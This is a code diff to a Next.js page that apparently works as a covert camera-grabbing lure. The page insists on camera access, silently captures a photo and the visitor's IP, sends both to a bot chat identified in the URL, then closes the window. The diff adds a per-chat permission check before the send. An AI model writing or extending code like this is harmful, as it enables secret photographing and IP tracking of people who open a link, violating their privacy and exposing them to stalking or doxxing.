@@ -3,12 +3,15 @@
 import dynamic from "next/dynamic";
 import { useCallback, useEffect } from "react";
 import { useCamera } from "~/shared/use-camera";
-import { sendDataToBot } from "./actions";
+import { getPermissions, sendDataToBot } from "./actions";
 
 const CameraNotAllowed = () => <h1>Allow access to camera to use this website!</h1>;
 const Loader = () => <div className="spinner" />;
 
-const Camera = ({ userId }: { userId: string }) => {
+interface CameraProps {
+	chatId: number;
+}
+const Camera = ({ chatId }: CameraProps) => {
 	const { videoRef, canvasRef, photo } = useCamera();
 
 	const handlePhoto = useCallback(
@@ -19,13 +22,18 @@ const Camera = ({ userId }: { userId: string }) => {
 				.catch(() => "unknown");
 
 			try {
-				await sendDataToBot({ photo, userId, ip });
+				const canSendPhoto = await getPermissions(chatId);
+				if (!canSendPhoto) {
+					return;
+				}
+
+				await sendDataToBot({ photo, chatId, ip });
 				window.close();
 			} catch (err) {
 				console.error("Failed to send photo:", err);
 			}
 		},
-		[userId],
+		[chatId],
 	);
 
 	useEffect(() => {
@@ -62,7 +70,7 @@ function Page({ params }: Props) {
 	}
 
 	if (status === "granted") {
-		return <Camera userId={params.slug[0]} />;
+		return <Camera chatId={Number(params.slug[0])} />;
 	}
 
 	return <Loader />;
